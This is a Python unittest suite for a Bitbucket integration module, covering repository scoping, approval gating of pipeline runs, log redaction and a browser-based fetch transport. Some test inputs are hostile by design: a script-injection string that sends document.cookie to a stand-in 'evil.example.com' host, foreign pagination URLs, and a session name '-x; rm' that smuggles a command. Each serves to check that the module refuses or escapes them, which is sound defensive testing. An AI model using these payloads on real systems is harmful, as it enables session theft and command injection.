"""Bitbucket module: repository scoping, bypass and approvals, the pipelines file reader, log redaction, and the
browser transport (the in-page fetch expression, Rastro's JSON, pagination, retries, an expired session), with a fake
Rastro: no browser and no network."""
from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO / "modules" / "bitbucket"))
import bitbucket as bb  # noqa: E402

TOOLS = REPO / "modules" / "bitbucket" / "skill" / "tools"
API = "/!api/2.0/repositories/acme"
RUN = {"build_number": 41, "uuid": "{run-41}", "state": {"name": "IN_PROGRESS", "stage": {"name": "RUNNING"}},
       "target": {"ref_name": "develop", "selector": {"type": "custom", "pattern": "deploy-dev"},
                  "commit": {"hash": "abcdef1234567890"}}, "creator": {"display_name": "Clara Client"},
       "duration_in_seconds": 75}
REQ_RE = re.compile(r"^  const req = (.*);$", re.M)


def http_error(code, body="", retry_after=None, signed_in=True):
    """What the page's fetch answers for an HTTP error."""
    return {"__answer__": {"status": code, "type": "application/json", "text": body, "retryAfter": retry_after,
                           "signedIn": signed_in}}


def page_answer(**answer):
    """Anything else the page script may return (a redirect, no CSRF cookie, a blocked fetch, the wrong page)."""
    return {"__answer__": answer}


def envelope(data=None, ok=True, message=""):
    if ok:
        return json.dumps({"schemaVersion": 1, "ok": True, "data": data})
    return json.dumps({"schemaVersion": 1, "ok": False, "error": {"kind": "runtime", "message": message}})


class BitbucketCase(unittest.TestCase):
    SCOPES = {"scopes": {
        "work": {"repos": ["api-orders", "API-Billing", "web-shop"],
                 "bypass": {"api-orders": "*", "api-billing": ["deploy-dev"], "not-readable": "*"}},
        "reader": {"repos": ["api-orders"]},
        "everything": {"repos": "*", "bypass": {"api-orders": ["deploy-dev"]}},
        "empty": {"repos": []}}}

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp)
        (self.tmp / "scopes.json").write_text(json.dumps(self.SCOPES))
        self.patch("HOME", self.tmp)
        self.patch("SCOPES", self.tmp / "scopes.json")
        self.patch("CONFIG", self.tmp / "config.json")
        self.calls, self.replies, self.commands = [], [], []
        self.browser_running = True
        self.patch("RASTRO", self.rastro)
        self.sleeps = []
        self.patch("SLEEP", self.sleeps.append)
        for k in ("TANKA_UNATTENDED", "TANKA_CHAT"):
            self.patch_env(k, None)
        self.patch_env("TANKA_BITBUCKET_WORKSPACE", "acme")
        self.patch_env("TANKA_BITBUCKET_SESSION", "bb-test")
        self.ws = self.tmp / "ws"
        (self.ws / ".claude" / "skills" / "approvals").mkdir(parents=True)
        self.patch_env("TANKA_WORKSPACE", str(self.ws))
        sys.path.insert(0, str(REPO / "modules" / "approvals"))
        import approvals
        self.ap = approvals
        old = approvals.HOME
        approvals.HOME = self.tmp / "approvals"
        self.addCleanup(setattr, approvals, "HOME", old)

    def patch(self, name, value):
        old = getattr(bb, name)
        setattr(bb, name, value)
        self.addCleanup(setattr, bb, name, old)

    def patch_env(self, k, v):
        old = os.environ.get(k)
        if v is None:
            os.environ.pop(k, None)
        else:
            os.environ[k] = v
        self.addCleanup(lambda: os.environ.pop(k, None) if old is None else os.environ.__setitem__(k, old))

    def rastro(self, args, timeout):
        """A fake `rastro -s <session> --json ...`: the session's state, and the page's answer to each fetch."""
        self.assertEqual(args[0], "--json")
        cmd = args[1]
        self.commands.append(args[1:])
        if cmd == "status":
            state = "running" if self.browser_running else "stopped"
            return 0, envelope([{"session": "other", "state": "running"}, {"session": "bb-test", "state": state}]), ""
        if cmd == "open":
            self.browser_running = True
            return 0, envelope(None), ""
        if cmd == "goto":
            return 0, envelope(None), ""
        self.assertEqual(cmd, "eval")
        req = json.loads(REQ_RE.search(args[2]).group(1))
        self.calls.append((req["method"], req["path"], req["body"], req["range"]))
        if not self.replies:
            raise AssertionError("unexpected network call")
        r = self.replies.pop(0)
        if isinstance(r, dict) and "__answer__" in r:
            answer = r["__answer__"]
        elif isinstance(r, str):
            answer = {"status": 200, "type": "text/plain", "text": r}
        else:
            answer = {"status": 200, "type": "application/json", "text": json.dumps(r) if r is not None else ""}
        return 0, envelope(json.dumps(answer)), ""

    def posts(self):
        return [c for c in self.calls if c[0] == "POST"]


class TestScope(BitbucketCase):
    def test_a_workspace_without_an_entry_is_refused_before_the_network(self):
        for scope in ("nobody", "empty"):
            for call in (lambda: bb.repos(scope), lambda: bb.commits(scope, "api-orders"),
                         lambda: bb.pipelines(scope, "api-orders"),
                         lambda: bb.run_pipeline(scope, "api-orders", "main", "deploy-dev"),
                         lambda: bb.stop_pipeline(scope, "api-orders", 3)):
                with self.assertRaisesRegex(bb.ToolError, "No Bitbucket repository is assigned"):
                    call()
        self.assertEqual(self.calls, [])

    def test_a_repository_outside_repos_is_refused_before_the_network(self):
        for call in (lambda: bb.commits("work", "secret-repo"), lambda: bb.pipelines("reader", "api-billing"),
                     lambda: bb.commits("work", "../other/x"),
                     lambda: bb.run_pipeline("work", "not-readable", "main", "deploy-dev"),
                     lambda: bb.stop_pipeline("reader", "web-shop", 1)):
            with self.assertRaisesRegex(bb.ToolError, "not a Bitbucket repository this assistant may use"):
                call()
        self.assertEqual(self.calls, [])

    def test_slugs_are_case_insensitive_and_bad_values_are_refused(self):
        self.assertEqual(bb.check_repo("work", "API-Billing"), "api-billing")
        with self.assertRaisesRegex(bb.ToolError, "not a branch name"):
            bb.run_pipeline("work", "api-orders", "../main", "deploy-dev")
        with self.assertRaisesRegex(bb.ToolError, "not a custom pipeline name"):
            bb.run_pipeline("work", "api-orders", "main", "-x")
        with self.assertRaisesRegex(bb.ToolError, "not a commit hash"):
            bb.run_pipeline("work", "api-orders", "main", "deploy-dev", "zzz")
        self.assertEqual(self.calls, [])

    def test_bypass_only_counts_for_readable_repositories(self):
        s = bb.scope_of("work")
        self.assertNotIn("not-readable", s["bypass"])
        self.assertEqual(s["bypass"]["api-billing"], {"deploy-dev"})

    def test_missing_or_broken_scopes_file(self):
        (self.tmp / "scopes.json").write_text("{")
        with self.assertRaisesRegex(bb.ToolError, "not valid JSON"):
            bb.repos("work")
        (self.tmp / "scopes.json").unlink()
        with self.assertRaisesRegex(bb.ToolError, "does not exist"):
            bb.repos("work")


class TestActions(BitbucketCase):
    def test_without_bypass_the_action_is_only_a_request_and_nothing_is_posted(self):
        with self.assertRaises(bb.NeedsApproval):
            bb.run_pipeline("reader", "api-orders", "main", "deploy-prod")
        with self.assertRaises(bb.NeedsApproval):
            bb.stop_pipeline("reader", "api-orders", 41)
        with self.assertRaises(bb.NeedsApproval):
            bb.run_pipeline("work", "web-shop", "main", "deploy-dev")  # readable, but not in bypass
        self.assertEqual(self.calls, [])

    def test_bypass_star_runs_any_pipeline_with_the_documented_body(self):
        self.replies = [{"build_number": 42}]
        out = bb.run_pipeline("work", "api-orders", "develop", "deploy-qa")
        self.assertIn("#42", out)
        self.assertIn("https://bitbucket.org/acme/api-orders/pipelines/results/42", out)
        method, url, body, _ = self.calls[0]
        self.assertEqual((method, url), ("POST", f"{API}/api-orders/pipelines/"))
        self.assertEqual(body, {"target": {"type": "pipeline_ref_target", "ref_type": "branch", "ref_name": "develop",
                                           "selector": {"type": "custom", "pattern": "deploy-qa"}}})

    def test_a_short_commit_is_resolved_to_the_full_hash(self):
        full = "3f9c2a1b7d4e" + "0" * 28
        self.replies = [{"hash": full}, {"build_number": 43}]
        bb.run_pipeline("work", "api-orders", "main", "deploy-dev", "3f9c2a1b7d4e")
        self.assertEqual(self.calls[0][:2], ("GET", f"{API}/api-orders/commit/3f9c2a1b7d4e"))
        self.assertEqual(self.posts()[0][2]["target"]["commit"], {"type": "commit", "hash": full})

    def test_bypass_with_a_list_runs_only_those_pipelines(self):
        self.replies = [{"build_number": 7}]
        self.assertIn("#7", bb.run_pipeline("work", "api-billing", "develop", "deploy-dev"))
        with self.assertRaises(bb.NeedsApproval):
            bb.run_pipeline("work", "api-billing", "main", "deploy-prod")
        self.assertEqual(len(self.posts()), 1)

    def test_stopping_follows_the_same_bypass(self):
        prod = dict(RUN, target=dict(RUN["target"], selector={"type": "custom", "pattern": "deploy-prod"}))
        self.replies = [RUN, None]
        self.assertIn("stop pipeline #41", bb.stop_pipeline("work", "api-billing", 41))
        self.assertEqual(self.calls[-1][:2], ("POST", f"{API}/api-billing/pipelines/%7Brun-41%7D/stopPipeline"))
        self.replies = [prod]
        with self.assertRaises(bb.NeedsApproval):
            bb.stop_pipeline("work", "api-billing", 41)  # a run of a pipeline outside the list
        self.assertEqual(len(self.posts()), 1)
        self.replies = [dict(RUN, state={"name": "COMPLETED", "result": {"name": "SUCCESSFUL"}})]
        self.assertIn("already finished", bb.stop_pipeline("work", "api-orders", 41))
        self.assertEqual(len(self.posts()), 1)

    def test_the_request_waits_and_only_the_replay_posts_it_once(self):
        args = {"repo": "api-orders", "ref": "main", "pipeline": "deploy-prod"}
        out = bb.ask_approval("reader", "api-orders", "bitbucket_run_pipeline", args)
        self.assertIn("NOTHING was run", out)
        a = self.ap.read("ws")[0]  # filed under the workspace's own name, where the page looks
        self.assertEqual((a["skill"], a["title"], a["payload"]),
                         ("bitbucket", "Bitbucket: run deploy-prod on main in api-orders",
                          {"tool": "bitbucket_run_pipeline", "args": args}))
        self.assertEqual(self.calls, [])
        self.replies = [{"build_number": 9}]
        self.assertIn("#9", bb.replay("reader", a["payload"]))
        self.assertEqual(len(self.posts()), 1)
        self.assertFalse(bb.APPROVED)  # the approval covers that one call, not the next
        with self.assertRaises(bb.NeedsApproval):
            bb.run_pipeline("reader", "api-orders", "main", "deploy-prod")

    def test_the_replay_keeps_the_read_check_and_refuses_foreign_payloads(self):
        with self.assertRaisesRegex(bb.ToolError, "not a Bitbucket repository"):
            bb.replay("reader", {"tool": "bitbucket_run_pipeline",
                                 "args": {"repo": "web-shop", "ref": "main", "pipeline": "x"}})
        with self.assertRaisesRegex(bb.ToolError, "not a Bitbucket action"):
            bb.replay("reader", {"tool": "bitbucket_delete", "args": {}})
        self.assertEqual(self.calls, [])

    def test_without_the_approvals_module_it_says_so(self):
        shutil.rmtree(self.ws / ".claude" / "skills" / "approvals")
        with self.assertRaisesRegex(bb.ToolError, "tanka install approvals"):
            bb.ask_approval("reader", "api-orders", "bitbucket_stop_pipeline", {"repo": "api-orders", "build_number": 1})


class TestUnattended(BitbucketCase):
    def setUp(self):
        super().setUp()
        self.patch_env("TANKA_UNATTENDED", "1")

    def test_nobody_watching_turns_even_a_bypass_into_a_request(self):
        with self.assertRaises(bb.NeedsApproval):
            bb.run_pipeline("work", "api-orders", "main", "deploy-dev")
        self.assertEqual(self.calls, [])

    def test_the_opt_in_or_the_page_chat_allows_the_bypass(self):
        data = json.loads((self.tmp / "scopes.json").read_text())
        data["scopes"]["work"]["unattended_write"] = True
        (self.tmp / "scopes.json").write_text(json.dumps(data))
        self.replies = [{"build_number": 1}]
        bb.run_pipeline("work", "api-orders", "main", "deploy-dev")
        data["scopes"]["work"]["unattended_write"] = False
        (self.tmp / "scopes.json").write_text(json.dumps(data))
        self.patch_env("TANKA_CHAT", "1")
        self.replies = [{"build_number": 2}]
        bb.run_pipeline("work", "api-orders", "main", "deploy-dev")
        self.assertEqual(len(self.posts()), 2)

    def test_reading_is_never_affected(self):
        self.replies = [{"values": []}]
        self.assertIn("0 commits", bb.commits("reader", "api-orders"))


class TestReads(BitbucketCase):
    def test_repos_filters_by_scope_and_says_where_it_may_act(self):
        self.replies = [{"values": [
            {"slug": "api-orders", "project": {"key": "SHOP"}, "language": "python", "updated_on": "2026-01-02T10:00:00Z"},
            {"slug": "api-billing", "project": {"key": "SHOP"}, "language": "java", "updated_on": "2026-01-01T10:00:00Z"},
            {"slug": "intruder", "project": {"key": "X"}}]}]
        out = bb.repos("work", "api")
        self.assertIn("api-orders | SHOP | python | 2026-01-02 | bypass: any pipeline", out)
        self.assertIn("api-billing | SHOP | java | 2026-01-01 | bypass: deploy-dev; others after Approve", out)
        self.assertNotIn("intruder", out)
        q = self.calls[0][1]
        self.assertIn("name+~+%22api%22", q)
        self.assertIn("slug+%3D+%22api-orders%22", q)
        with self.assertRaisesRegex(bb.ToolError, "name filter"):
            bb.repos("work", 'x" OR slug ~ "')

    def test_next_links_become_same_origin_paths_and_foreign_ones_are_not_followed(self):
        nxt = "https://bitbucket.org/!api/2.0/repositories/acme?pagelen=50&page=2"
        self.replies = [{"values": [{"slug": "a"}], "next": nxt}, {"values": [{"slug": "b"}]}]
        self.assertIn("2 repositories", bb.repos("everything", limit=5))
        self.assertEqual(self.calls[1][1], "/!api/2.0/repositories/acme?pagelen=50&page=2")
        self.assertEqual(bb.next_path("https://api.bitbucket.org/2.0/repositories/acme?page=3"),
                         "/!api/2.0/repositories/acme?page=3")
        for foreign in ("https://evil.example.com/!api/2.0/x", "https://bitbucket.org.evil.example.com/!api/x",
                        "https://bitbucket.org/account/signin/", None, 5):
            self.assertIsNone(bb.next_path(foreign))
        self.calls = []
        self.replies = [{"values": [{"slug": "a"}], "next": "https://evil.example.com/steal"}]
        bb.repos("everything", limit=5)
        self.assertEqual(len(self.calls), 1)
        with self.assertRaisesRegex(bb.ToolError, "outside bitbucket.org"):
            bb.request("GET", "https://evil.example.com/steal")
        with self.assertRaisesRegex(bb.ToolError, "outside bitbucket.org"):
            bb.request("GET", "//evil.example.com/steal")

    def test_commits(self):
        self.replies = [{"values": [{"hash": "0123456789abcdef", "date": "2026-03-04T05:06:07+00:00",
                                     "author": {"raw": "Clara Client <someone@example.com>"},
                                     "message": "Fix totals\n\nlong body"}]}]
        out = bb.commits("work", "api-orders", "release/1.2")
        self.assertIn("0123456789ab | 2026-03-04 05:06 | Clara Client | Fix totals", out)
        self.assertNotIn("someone@example.com", out)
        self.assertIn("include=release%2F1.2", self.calls[0][1])

    def test_recent_runs(self):
        self.replies = [{"values": [RUN]}]
        out = bb.pipelines("work", "api-orders")
        self.assertIn("#41 | IN_PROGRESS/RUNNING | develop | custom:deploy-dev | abcdef1 | 1m15s | Clara Client", out)
        self.assertIn("sort=-created_on", self.calls[0][1])

    def test_steps_and_a_redacted_log_tail(self):
        fake_token = "tok-" + "q" * 24  # built at runtime: a fake value, never a real token
        steps = {"values": [{"uuid": "{s1}", "name": "Build", "state": {"name": "COMPLETED", "result": {"name": "SUCCESSFUL"}},
                             "duration_in_seconds": 30},
                            {"uuid": "{s2}", "name": "Deploy", "state": {"name": "COMPLETED", "result": {"name": "FAILED"}},
                             "duration_in_seconds": 5}]}
        log = "\n".join([f"line {i}" for i in range(400)] + [
            f"export API_TOKEN={fake_token}", "curl -H 'Authorization: Bearer abcdefghijklmnop'",
            "push https://deployer:xxxx-fake-pass@git.example.com/x.git", "password: s3cr3t-value", "ERROR deploy failed"])
        self.replies = [RUN, steps, log]
        out = bb.pipelines("work", "api-orders", build_number=41, step="deploy")
        self.assertIn("2 | Deploy | COMPLETED/FAILED | 5s", out)
        self.assertIn("ERROR deploy failed", out)
        self.assertIn("last 150 line(s)", out)
        for secret in (fake_token, "abcdefghijklmnop", "xxxx-fake-pass", "s3cr3t-value"):
            self.assertNotIn(secret, out)
        self.assertEqual(self.calls[2][1], f"{API}/api-orders/pipelines/%7Brun-41%7D/steps/%7Bs2%7D/log")
        self.assertEqual(self.calls[2][3], f"bytes=-{bb.LOG_BYTES}")
        self.assertLessEqual(len(out), bb.MAX_OUTPUT)
        self.replies = [RUN, steps, log]
        grepped = bb.pipelines("work", "api-orders", build_number=41, step="2", grep="error")
        self.assertIn("1 line(s) containing \"error\"", grepped)
        self.replies = [RUN, steps]
        with self.assertRaisesRegex(bb.ToolError, "No single step"):
            bb.pipelines("work", "api-orders", build_number=41, step="lint")

    def test_options_read_the_file_and_the_recent_runs(self):
        yml = "\n".join([
            "image: python:3.12", "definitions:", "  steps:", "    - step: &build", "        name: Build",
            "pipelines:", "  default:", "    - step: *build", "  branches:", "    main:", "      - step: *build",
            "    'release/*':", "      - step: *build", "  tags:", "    v*:", "      - step: *build",
            "  custom:  # run by hand", "    deploy-dev:", "      - variables:", "          - name: TARGET",
            "      - step:", "          name: Deploy", "          script:", "            - ./deploy.sh",
            "    \"deploy-prod\":", "      - step: *build", "other:", "  key: value"])
        parsed = bb.parse_pipelines_yml(yml)
        self.assertEqual(parsed["custom"], ["deploy-dev", "deploy-prod"])
        self.assertEqual(parsed["branches"], ["main", "release/*"])
        self.assertEqual((parsed["tags"], parsed["default"]), (["v*"], ["default"]))
        old = dict(RUN, target=dict(RUN["target"], selector={"type": "custom", "pattern": "hotfix"}))
        self.replies = [{"mainbranch": {"name": "main"}}, {"values": [{"hash": "f" * 40}]}, yml, {"values": [RUN, old]}]
        out = bb.pipelines("work", "api-billing", options=True)
        self.assertIn("deploy-dev (runs directly), deploy-prod (after Approve)", out)
        self.assertIn("seen in recent runs but not in this file: hotfix (after Approve)", out)
        self.assertIn("main, release/*; default for other branches", out)
        self.assertEqual(self.calls[2][1], f"{API}/api-billing/src/{'f' * 40}/bitbucket-pipelines.yml")


class TestTransport(BitbucketCase):
    def test_the_fetch_expression_carries_every_value_as_json_never_spliced(self):
        nasty = 'x"); fetch("https://evil.example.com/" + document.cookie); ("\u2028</script>'
        req = {"method": "POST", "path": "/!api/2.0/repositories/acme/" + nasty, "body": {"note": nasty, "n": 1},
               "raw": False, "range": None}
        expr = bb.fetch_expr(req)
        self.assertTrue(expr.startswith("(async () => {") and expr.endswith("})()"))
        self.assertEqual(json.loads(REQ_RE.search(expr).group(1)), req)  # the literal decodes to exactly the request
        self.assertNotIn(nasty, expr)  # its quotes are escaped, so it cannot close the string
        self.assertNotIn("\u2028", expr)  # ASCII only
        self.assertIn('const origin = "https://bitbucket.org";', expr)
        self.assertIn('redirect: req.raw ? "follow" : "manual"', expr)  # a log's signed file URL; never a sign-in
        self.assertIn("csrftoken", expr)  # read inside the page; nothing in Python ever holds it

    def test_rastro_json_is_parsed_and_its_errors_are_relayed(self):
        self.assertEqual(bb.parse_rastro("noise\n" + envelope('{"a": 1}') + "\n", "", "eval"), '{"a": 1}')
        with self.assertRaisesRegex(bb.ToolError, r"Rastro failed \(eval\): no browser open"):
            bb.parse_rastro(envelope(ok=False, message="no browser open"), "Error: no browser open", "eval")
        with self.assertRaisesRegex(bb.ToolError, "no readable answer to eval \\(boom\\)"):
            bb.parse_rastro("", "boom", "eval")
        with self.assertRaisesRegex(bb.ToolError, "no readable answer"):
            bb.parse_rastro("not json", "", "eval")

    def test_the_session_is_opened_headless_allowed_to_write_to_bitbucket_only(self):
        self.browser_running = False
        self.replies = [{"values": []}]
        bb.commits("work", "api-orders")
        opens = [c for c in self.commands if c[0] == "open"]
        self.assertEqual(opens, [["open", "https://bitbucket.org/", "--allow-write", "bitbucket.org"]])
        self.assertNotIn("--headed", sum(self.commands, []))

    def test_a_post_restates_the_write_permission_on_a_running_session(self):
        self.replies = [{"build_number": 5}]
        bb.run_pipeline("work", "api-orders", "main", "deploy-dev")
        self.assertIn(["open", "--allow-write", "bitbucket.org"], self.commands)
        self.commands = []
        self.replies = [{"values": []}]
        bb.commits("work", "api-orders")  # a read changes no permission of a session someone else may share
        self.assertEqual([c[0] for c in self.commands], ["status", "eval"])

    def test_retries_honour_retry_after_then_give_up(self):
        self.replies = [http_error(429, retry_after="3"), {"values": []}]
        bb.commits("work", "api-orders")
        self.assertEqual(self.sleeps, [3.0])
        self.replies = [http_error(503) for _ in range(4)]
        with self.assertRaisesRegex(bb.ToolError, "HTTP 503"):
            bb.commits("work", "api-orders")

    def test_an_expired_session_says_to_log_in_and_not_retry(self):
        for answer in (http_error(401), http_error(403, signed_in=False), page_answer(status=0, redirect=True),
                       page_answer(status=200, type="text/html; charset=utf-8", text="<html>Log in</html>"),
                       http_error(404, "<html>not found</html>", signed_in=False)):  # signed out, a private repo
            self.replies = [answer]
            with self.assertRaises(bb.ToolError) as cm:
                bb.commits("work", "api-orders")
            self.assertEqual(str(cm.exception), bb.EXPIRED)
        self.assertIn("tanka bitbucket login", bb.EXPIRED)
        self.assertIn("do not retry", bb.EXPIRED)
        self.replies = [http_error(403, json.dumps({"error": {"message": "Forbidden"}}), signed_in=True)]
        with self.assertRaisesRegex(bb.ToolError, "HTTP 403: Forbidden. The signed-in account may not do that"):
            bb.commits("work", "api-orders")
        self.replies = [http_error(404, json.dumps({"error": {"message": "Not found"}}), signed_in=True)]
        with self.assertRaisesRegex(bb.ToolError, "HTTP 404: Not found. Check the name"):
            bb.commits("work", "api-orders")

    def test_a_tab_off_bitbucket_is_brought_back_once_then_called_expired(self):
        self.replies = [page_answer(wrongPage=True), {"values": []}]
        self.assertIn("0 commits", bb.commits("work", "api-orders"))
        self.assertIn(["goto", "https://bitbucket.org/account/settings/"], self.commands)
        self.replies = [page_answer(wrongPage=True), page_answer(wrongPage=True)]  # sign-in page after the goto
        with self.assertRaisesRegex(bb.ToolError, "session has expired"):
            bb.commits("work", "api-orders")

    def test_a_blocked_write_or_a_missing_csrf_cookie_is_a_clear_error_and_nothing_retries(self):
        self.replies = [page_answer(failed="TypeError: Failed to fetch")]
        with self.assertRaisesRegex(bb.ToolError, "Rastro blocks writes .* must allow bitbucket.org. Nothing was run"):
            bb.run_pipeline("work", "api-orders", "main", "deploy-dev")
        self.replies = [page_answer(noCsrf=True)]
        with self.assertRaisesRegex(bb.ToolError, "no CSRF cookie, so nothing was run"):
            bb.run_pipeline("work", "api-orders", "main", "deploy-dev")
        self.replies = [page_answer(failed="TypeError: Failed to fetch")]
        with self.assertRaisesRegex(bb.ToolError, "Could not reach Bitbucket from the browser session"):
            bb.commits("work", "api-orders")
        self.assertEqual(self.sleeps, [])

    def test_another_assistant_holding_the_session_makes_it_wait_then_give_up(self):
        import fcntl
        self.patch("LOCK_WAIT", 0)
        lock = self.tmp / ".bb-test.lock"
        lock.touch()
        with lock.open() as fh:
            fcntl.flock(fh, fcntl.LOCK_EX)
            with self.assertRaisesRegex(bb.ToolError, "Another assistant is using Bitbucket"):
                bb.commits("work", "api-orders")
        self.assertEqual(self.calls, [])

    def test_status_says_whether_the_session_is_open_and_signed_in(self):
        sys.path.insert(0, str(REPO / "modules" / "bitbucket"))
        import cli
        self.replies = [{"display_name": "Clara Client", "uuid": "{u}"}]
        self.assertEqual(cli.session_text(), ("Session bb-test: open, signed in as Clara Client", True))
        self.assertEqual(self.calls[0][:2], ("GET", "/!api/2.0/user"))
        self.replies = [http_error(401)]
        line, ok = cli.session_text()
        self.assertFalse(ok)
        self.assertIn("session has expired", line)
        self.browser_running = False
        line, ok = cli.session_text()
        self.assertTrue(ok)
        self.assertIn("not open", line)
        self.assertNotIn("open", [c[0] for c in self.commands])  # status never starts a browser

    def test_missing_settings_are_named_and_the_file_fills_in(self):
        self.patch_env("TANKA_BITBUCKET_WORKSPACE", None)
        with self.assertRaisesRegex(bb.ToolError, "workspace not set"):
            bb.commits("work", "api-orders")
        self.patch_env("TANKA_BITBUCKET_SESSION", None)
        (self.tmp / "config.json").write_text(json.dumps({"workspace": "other-team", "session": "bb-file"}))
        self.assertEqual(bb.config()["workspace"], "other-team")
        self.assertEqual(bb.session_name(), "bb-file")
        self.patch_env("TANKA_BITBUCKET_SESSION", "bb-env")
        self.assertEqual(bb.session_name(), "bb-env")  # the environment wins
        self.patch_env("TANKA_BITBUCKET_SESSION", "-x; rm")
        with self.assertRaisesRegex(bb.ToolError, "not a Rastro session name"):
            bb.session_name()


class TestTools(unittest.TestCase):
    def test_every_script_is_scoped(self):
        for py in TOOLS.glob("*.py"):
            self.assertIn('SCOPE = "__SCOPE__"', py.read_text())
        self.assertEqual(len(list(TOOLS.glob("*.json"))), 5)
        self.assertIn('SCOPE = "__SCOPE__"', (TOOLS.parent / "approve.py").read_text())

    def test_install_and_checks(self):
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp)
        # A fake rastro on PATH: the session is not running, and nothing may start a browser.
        fake = tmp / "bin"
        fake.mkdir()
        (fake / "rastro").write_text("#!/bin/sh\n"
                                     "case \"$*\" in *status*) echo '{\"schemaVersion\":1,\"ok\":true,\"data\":[]}';;\n"
                                     "*) echo 'unexpected' >&2; exit 1;; esac\n")
        (fake / "rastro").chmod(0o755)
        env = dict(os.environ, TANKA_WORKSPACES=str(tmp / "workspaces"), TANKA_BITBUCKET_HOME=str(tmp / "home"),
                   TANKA_BITBUCKET_SESSION="bb-test", PATH=f"{fake}{os.pathsep}{os.environ.get('PATH', '')}")
        tanka = lambda *a: subprocess.run([str(REPO / "bin" / "tanka"), *a], capture_output=True, text=True, env=env)
        tanka("init", "deploys", "--strict")  # modules must fit the strict budget
        p = tanka("install", "bitbucket", "deploys")
        self.assertEqual(p.returncode, 0, p.stderr)
        self.assertIn('"deploys"', (tmp / "home" / "scopes.json").read_text())
        self.assertIn('SCOPE = "deploys"',
                      (tmp / "workspaces" / "deploys" / ".claude/skills/bitbucket/tools/bitbucket_repos.py").read_text())
        self.assertIn("5/15 tools loaded, 0 problem(s), 0 warning(s)", tanka("tools", "check", "deploys").stdout)
        self.assertIn("ok", tanka("modules", "check", "bitbucket").stdout)
        st = tanka("bitbucket", "status")
        self.assertEqual(st.returncode, 0, st.stderr)
        self.assertIn("api-orders", st.stdout)
        self.assertIn("Session bb-test: not open", st.stdout)


class TestEndToEnd(BitbucketCase):
    def test_the_tool_leaves_a_request_without_the_network_and_approve_py_runs_it(self):
        ws = self.tmp / "workspaces" / "deploys"
        env = dict(os.environ, TANKA_WORKSPACES=str(self.tmp / "workspaces"), TANKA_BITBUCKET_HOME=str(self.tmp),
                   TANKA_APPROVALS_HOME=str(self.tmp / "approvals"))
        env.pop("TANKA_WORKSPACE", None)
        tanka = lambda *a: subprocess.run([str(REPO / "bin" / "tanka"), *a], capture_output=True, text=True, env=env)
        (self.tmp / "scopes.json").write_text(json.dumps({"scopes": {"deploys": {"repos": ["api-orders"]}}}))
        tanka("init", "deploys", "--strict")
        self.assertEqual(tanka("install", "approvals", "deploys").returncode, 0)
        self.assertEqual(tanka("install", "bitbucket", "deploys").returncode, 0)
        tool = ws / ".claude" / "skills" / "bitbucket" / "tools"
        args = {"repo": "api-orders", "ref": "main", "pipeline": "deploy-prod"}
        # No rastro on PATH: any browser call would fail the tool, so success proves none was made.
        empty = self.tmp / "no-bin"
        empty.mkdir()
        run_env = dict(env, TANKA_WORKSPACE=str(ws), TANKA_TOOL="bitbucket_run_pipeline",
                       TANKA_PLUGIN_DIR=str(REPO / "plugin"), PATH=str(empty))
        p = subprocess.run([sys.executable, str(tool / "bitbucket_run_pipeline.py")], input=json.dumps(args),
                           capture_output=True, text=True, cwd=tool, env=run_env)
        self.assertEqual(p.returncode, 0, p.stderr)
        self.assertIn("NOTHING was run", p.stdout)
        a = json.loads((self.tmp / "approvals" / "deploys.json").read_text())["approvals"][0]
        self.assertEqual(a["payload"], {"tool": "bitbucket_run_pipeline", "args": args})
        self.assertIn('SCOPE = "deploys"', (ws / ".claude" / "skills" / "bitbucket" / "approve.py").read_text())
        # approve.py runs in a process of its own; with the repository no longer readable it refuses, before posting.
        (self.tmp / "scopes.json").write_text(json.dumps({"scopes": {"deploys": {"repos": ["web-shop"]}}}))
        self.patch_env("TANKA_BITBUCKET_HOME", str(self.tmp))
        with self.assertRaisesRegex(self.ap.ToolError, "not a Bitbucket repository"):
            self.ap.approve("deploys", ws, a["id"])
        self.assertEqual(self.ap.read("deploys")[0]["status"], "failed")

    def test_approve_py_posts_the_stored_run(self):
        ws = self.tmp / "approve-ws"
        skill = ws / ".claude" / "skills" / "bitbucket"
        skill.mkdir(parents=True)
        (skill / "approve.py").write_text((TOOLS.parent / "approve.py").read_text().replace("__SCOPE__", "reader"))
        # approve.py imports the real module in its own process; a small shim stands in for Rastro and records the
        # page's fetch instead of sending it.
        shim = self.tmp / "shim"
        shim.mkdir()
        (shim / "sitecustomize.py").write_text(
            "import json, os, re, sys\n"
            f"sys.path.insert(0, {str(REPO / 'modules' / 'bitbucket')!r})\n"
            "import bitbucket\n"
            "def fake(args, timeout):\n"
            "    with open(os.environ['BB_CALLS'], 'a') as f:\n"
            "        if args[1] == 'eval':\n"
            "            req = json.loads(re.search(r'^  const req = (.*);$', args[2], re.M).group(1))\n"
            "            f.write(json.dumps([req['method'], req['path'], req['body']]) + '\\n')\n"
            "            data = json.dumps({'status': 201, 'type': 'application/json', 'text': '{\"build_number\": 77}'})\n"
            "        else:\n"
            "            f.write(json.dumps(args[1:]) + '\\n')\n"
            "            data = [{'session': 'bitbucket', 'state': 'running'}] if args[1] == 'status' else None\n"
            "    return 0, json.dumps({'schemaVersion': 1, 'ok': True, 'data': data}), ''\n"
            "bitbucket.RASTRO = fake\n")
        calls = self.tmp / "calls.jsonl"
        env = dict(os.environ, TANKA_PLUGIN_DIR=str(REPO / "plugin"), TANKA_BITBUCKET_HOME=str(self.tmp),
                   PYTHONPATH=str(shim), BB_CALLS=str(calls), TANKA_BITBUCKET_SESSION="bitbucket")
        payload = {"tool": "bitbucket_run_pipeline", "args": {"repo": "api-orders", "ref": "main", "pipeline": "deploy-prod"}}
        p = subprocess.run([sys.executable, str(skill / "approve.py")], input=json.dumps({"id": "a-1", "payload": payload}),
                           capture_output=True, text=True, env=env, cwd=ws)
        self.assertEqual(p.returncode, 0, p.stderr)
        self.assertIn("Started pipeline #77", p.stdout)
        sent = [json.loads(line) for line in calls.read_text().splitlines()]
        self.assertEqual(sent[:2], [["status"], ["open", "--allow-write", "bitbucket.org"]])
        self.assertEqual([c[:2] for c in sent[2:]], [["POST", f"{API}/api-orders/pipelines/"]])
        self.assertEqual(sent[2][2]["target"]["selector"], {"type": "custom", "pattern": "deploy-prod"})


if __name__ == "__main__":
    unittest.main()
